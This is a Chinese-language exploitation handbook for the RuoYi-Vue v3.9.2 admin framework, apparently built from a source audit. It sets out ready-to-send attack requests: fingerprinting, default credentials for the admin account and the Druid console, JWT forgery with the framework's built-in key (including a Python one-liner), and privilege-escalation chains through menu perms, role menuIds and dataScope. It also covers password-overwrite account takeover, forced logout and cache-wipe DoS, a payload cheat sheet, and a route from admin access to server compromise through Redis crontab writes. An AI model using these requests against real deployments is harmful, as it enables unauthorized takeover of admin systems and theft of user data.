# RuoYi-Vue（若依）后台漏洞利用手册 2026

> 来源：RuoYi-Vue v3.9.2 源码逐行审计（2026-08-15，8高危/16中危/17低危），每一条均含文件:行号级代码证据。本手册只保留**实战可直接利用**的链，标注触发条件与所需权限。
> 对应骨架：`memory/skeletons/ruoyi-v3.md`。审计全量报告：`D:\Desktop\Claude\audit\RuoYi-Vue\AUDIT_REPORT_20260815.md`

## 一、框架指纹（3 秒确认）

| 特征 | 检查点 |
|------|--------|
| 验证码 | `GET /prod-api/captchaImage` 返回 `{"captchaEnabled":true,...}`（或 `/dev-api/`、无前缀） |
| 前端 | 页面标题"XX管理系统"，webpack chunk：`chunk-elementUI.js` + `chunk-libs.js` + `app.*.js` |
| Swagger | `GET /prod-api/swagger-ui/index.html`、`/prod-api/v3/api-docs` |
| Druid | `GET /prod-api/druid/index.html` |
| 统一包装 | 所有 401/403 都是 **HTTP 200** + body `{"code":401,"msg":"认证失败"}` |
| 注册口 | `POST /prod-api/register`（isToken:false 免认证） |

> API 前缀 `prod-api`/`dev-api` 由 nginx 反代剥离，后端实际路径是 `/login`、`/druid/`、`/system/user` 等；测试时**带前缀**。所有 401 被包装成 200，识别时看 body `code`。

## 二、实战判定顺序（按投入产出排序）

```
① 匿名面（零成本，先打）
   Druid 弱口令 → H5
   注册口开启？/captchaEnabled=false？
② 默认口令
   admin/admin123 登录（RuoYi 初始 SQL 就是这个）
   Druid: ruoyi/123456
③ 低权账号 → 提权链（拿到任一低权后台账号后）
   H7 菜单perms提权（最快，system:menu:edit）
   H2 角色menuIds提权（system:role:edit）
   H8 dataScope自提升（system:role:edit）
   H1 改密接管（system:user:edit）
   H4 会话伪造（monitor:online:list）
④ 已登录任意用户可打的
   M10 TestController默认口令 /test/user/list
   M6 任意配置键 /system/config/configKey/{key}
   M7 角色权限矩阵 /system/menu/roleMenuTreeselect/{roleId}
   M3 PII越权 /system/user/authRole/{userId}
```

## 三、高危利用链（含请求包）

### H5 Druid 监控台匿名可达 + 默认口令（P0，匿名）

```
GET /prod-api/druid/index.html                 → 200 登录页
POST /prod-api/druid/submitLogin
    Content-Type: application/x-www-form-urlencoded
    loginUsername=ruoyi&loginPassword=123456   → 进入控制台
```
- 位置：`SecurityConfig.java:106` `/druid/**` permitAll + `application-druid.yml` statViewServlet 默认 `ruoyi/123456`
- 看：`/druid/sql.json`（全量 SQL+绑定参数，可能含敏感数据）、`/druid/datasource.json`（JDBC URL/内网数据库地址）、`/druid/websession.json`、慢 SQL
- 生产若改了口令：爆破弱口令字典；`allow` 为空=全 IP 放行
- **注意**：Druid wall 防火墙默认未启用（只配了 multi-statement-allow），但本审计未发现注入点，wall 意义不大

### H4 在线列表会话伪造（P0【条件】需 monitor:online:list）

```
① 拿会话uuid
GET /prod-api/monitor/online/list        → rows[].tokenId = login_tokens:{uuid} 的 uuid
② 用默认密钥签 JWT（HS512）
   密钥: abcdefghijklmnopqrstuvwxyz（application.yml token.secret，开源内置）
   claims: {"login_user_key":"<uuid>","login_user_name":"admin","sub":"admin"}
   Header: {"alg":"HS512"}
③ 请求
GET /prod-api/getInfo
    Authorization: Bearer <伪造JWT>      → 命中 Redis 会话 → 完整接管 admin
```
- 附带：`DELETE /prod-api/monitor/online/{tokenId}` forceLogout **无归属校验** → 可强制任意在线用户（含 admin）下线
- 签 JWT 用 python：`python -c "import jwt;print(jwt.encode({'login_user_key':'<uuid>','login_user_name':'admin'},'abcdefghijklmnopqrstuvwxyz',algorithm='HS512'))"`（PyJWT）

### H7 菜单 perms 改写 `*:*:*` → 一步提权（P0，需 system:menu:edit）

```
① 先枚举自己角色绑定的菜单，找一个有 system:menu:edit 的
   GET /prod-api/getRouters
② 改写 perms
PUT /prod-api/system/menu
    Authorization: Bearer <token>
    {"menuId":<已绑定菜单id>,"parentId":0,"menuName":"x","path":"x","perms":"*:*:*"}
③ 触发权限重算（getInfo 检测 DB 权限≠缓存 → 自动刷新 Redis 会话）
GET /prod-api/getInfo
④ 此后所有接口 @ss.hasPermi 恒真 → 等效超管
```
- 位置：SysMenuController.edit（无 perms 白名单）→ SysMenuMapper.xml:156 → getInfo:81-85 刷新 → SecurityUtils.hasPermi 对 `*:*:*` 恒真

### H2 角色 menuIds 越权授权（P0，需 system:role:edit）

```
① 枚举全部菜单 id
   GET /prod-api/system/menu/treeselect
② 给自己角色挂全部菜单
PUT /prod-api/system/role
    {"roleId":<自身角色id>,"roleName":"x","roleKey":"x","menuIds":[1,2,3,...]}
    → updateRole 后 refreshPermissionByRoleId 立即刷新在线会话（无需重登）
```
- checkRoleDataScope(自身角色) 自引用恒通过（H8 同根因）
- 若目标角色是 admin(roleId=1)：checkRoleAllowed 仅拦删除/状态，**编辑放行**

### H8 角色 dataScope 自提升 → 数据全开（P0，需 system:role:edit）

```
PUT /prod-api/system/role/dataScope
    {"roleId":<自身角色id>,"dataScope":"1"}     # 1=全部数据
    → authDataScope 写库，deptIds 无校验
# 重新登录后（dataScope 存缓存 roles），DataScopeAspect 对 DATA_SCOPE_ALL 不拼过滤
# → 所有 @DataScope 查询全局数据 + checkRoleDataScope 恒通过 → 可操作任意角色
# 叠加 H2 一次请求同时拿全菜单 → 全权限+全数据 → resetPwd 任意用户
```

### H1 用户编辑改密接管（P0，需 system:user:edit）

```
# 预生成 BCrypt 哈希（必须！传明文会锁死目标而非接管）
python -c "from bcrypt import hashpw,gensalt;print(hashpw(b'NewPass123',gensalt()).decode())"
PUT /prod-api/system/user
    {"userId":<目标id>,"password":"<BCrypt哈希>"}
    → updateUser 明文直写哈希 → 用 NewPass123 登录目标
# 附带：请求体不传 roleIds → 目标角色被清空（权限降级 DoS）
# userId=1(admin) 被 checkUserAllowed 拦，其他账号（含管理员）可打
```

### H3 越权授权/撤销角色（P0，需 system:role:edit）

```
PUT /prod-api/system/role/authUser/cancel      {"userId":X,"roleId":Y}        # 撤销
PUT /prod-api/system/role/authUser/selectAll   {"userIds":[X],"roleId":Y}     # 授权(给自己绑管理角色)
PUT /prod-api/system/role/authUser/cancelAll   {"userIds":[X],"roleId":Y}     # 批量撤销
# 均无 checkUserDataScope(目标userId) → 越权改任意账号角色
```

### H6 Redis 明文存 bcrypt 哈希（P0【条件】Redis 暴露）

```
探测: 6379 未授权（bind 0.0.0.0 + password 空，默认配置）或 SSRF 可打
redis: keys login_tokens:* → get <key> → 明文含 "$2a$10$..." bcrypt + 完整权限集
离线爆破 admin 默认 admin123；有写权限还可伪造会话（配合 H4 默认密钥）
# 根因: Redis 序列化走 fastjson2（不识别 Jackson 注解），SysUser.getPassword 的
# @JsonProperty(WRITE_ONLY) 只对 HTTP 响应(Jackson)生效，Redis 里哈希明文落盘
```

## 四、中危可直接利用

### M10 TestController 内置默认口令（需登录态，任意用户）
```
GET /prod-api/test/user/list    → [{"userId":1,"username":"admin","password":"admin123",...}]
# 硬编码明文默认口令；若目标未改 admin/admin123 直接用它登后台
```

### M11 下载接口删文件（需登录态）
```
GET /prod-api/common/download?fileName=<下载目录内文件名>&delete=true
# 范围: RuoYiConfig.getDownloadPath() 目录 + 扩展名白名单（png/jpg/doc 等）；无归属校验
```

### M6 任意配置键读取（需登录态，任意用户）
```
GET /prod-api/system/config/configKey/sys.user.initPassword   # 初始密码
GET /prod-api/system/config/configKey/sys.account.captchaEnabled
# 无 @PreAuthorize；可读 SMTP/OSS/Redis 等配置
```

### M7 角色权限矩阵枚举（需登录态，任意用户）
```
GET /prod-api/system/menu/roleMenuTreeselect/1   # admin 角色全部菜单id → 还原权限模型
GET /prod-api/system/menu/roleMenuTreeselect/<枚举roleId>
# 配合 H2/H7 选"该填哪些 menuId"
```

### M3 越权读任意用户 PII（需 system:user:query）
```
GET /prod-api/system/user/authRole/{userId}     # 遍历 → email/phonenumber/dept 全量
# 缺 checkUserDataScope；password 不返回（Jackson WRITE_ONLY）
```

### M2 缓存清库 DoS（需 monitor:cache:list）
```
DELETE /prod-api/monitor/cache/clearCacheAll     # keys("*") 全库删 → 全站强制下线
GET /prod-api/monitor/cache/getKeys/login_tokens # 枚举会话 uuid
```

### M9 全局异常回显（无需特定权限）
```
任意 POST/PUT 触发 SQL 错误（如排序列传异常值）→ 响应 msg 原样返回 SQL 片段/表名列名
# GlobalExceptionHandler 对 RuntimeException/Exception 返回 e.getMessage() 未脱敏
# 用途: 数据库指纹 + 报错注入回显通道
```

### M4/M13 登录侧 DoS + 验证码可破解
```
5 次错密 → pwd_err_cnt:{username} 锁 10 分钟（仅按用户名，换 IP 无效）
验证码: 算式答案空间 ≤81 + java.util.Random 可预测 → OCR/穷举自动过
# 对已知用户名(admin)循环锁 → 持续拒绝合法登录
```

## 五、确认不可利用（别浪费时间）

| 方向 | 结论 | 一句话证据 |
|------|------|-----------|
| 定时任务 RCE | **封死** | invokeTarget whiteList 强制 `com.ruoyi.quartz.task` 前缀（ScheduleUtils:128-140），RyTask 只有 println |
| fastjson 反序列化 RCE | **不可达** | Redis AUTO_TYPE_FILTER 白名单 `{"com.ruoyi"}`，包内无 gadget |
| SQL 注入 | **排除** | 全 20 Mapper `${dataScope}` 服务端生成、orderBy 白名单正则、其余全 #{} |
| 上传 getshell | **封死** | 扩展名白名单+MIME+UUID 重命名，无 JSP/可执行落地 |
| 下载穿越 | **不可达** | checkAllowDownload 拒 `..` + 扩展名白名单 |
| /getInfo 泄露哈希 | **不成立** | HTTP 响应走 Jackson，@JsonProperty(WRITE_ONLY) 排除 password |
| JWT 弱密钥单独利用 | **需配合** | JWT 只存 uuid，认证在 Redis；单伪造无效（要 H4 tokenId 或 H6 Redis 写） |

## 六、RuoYi RCE 现实路径

**框架本身无直接 RCE 出口**。真实 getshell 路线：
```
低权提权(H2/H7/H8/H1) → admin 或任意管理员
→ 打部署层中间件: Tomcat 弱口令/WAR部署 · Redis 未授权写crontab · 
  Druid(datasource.json)拿数据库口令连库提权 · generator代码生成(条件链)
→ 若 admin 也无法 getshell: 框架无内置后门，需外溢到主机
```

## 七、Payload 速查

| 目标 | 请求 |
|------|------|
| 登录 | `POST /login` JSON `{"username":"admin","password":"admin123","code":"<验证码>","uuid":"<uuid>"}` |
| 拿验证码 | `GET /captchaImage` → `{uuid, img(base64)}` |
| 拿 token | 登录响应 `token` 字段 → `Authorization: Bearer <token>` |
| 伪造 JWT | HS512 密钥 `abcdefghijklmnopqrstuvwxyz` |
| Druid | `POST /druid/submitLogin` `loginUsername=ruoyi&loginPassword=123456` |
| 强制下线 | `DELETE /monitor/online/{tokenId}` |
| 默认口令 | `admin/admin123`（SQL 初始）、`ruoyi/123456`（Druid）、`admin/admin123`（TestController） |
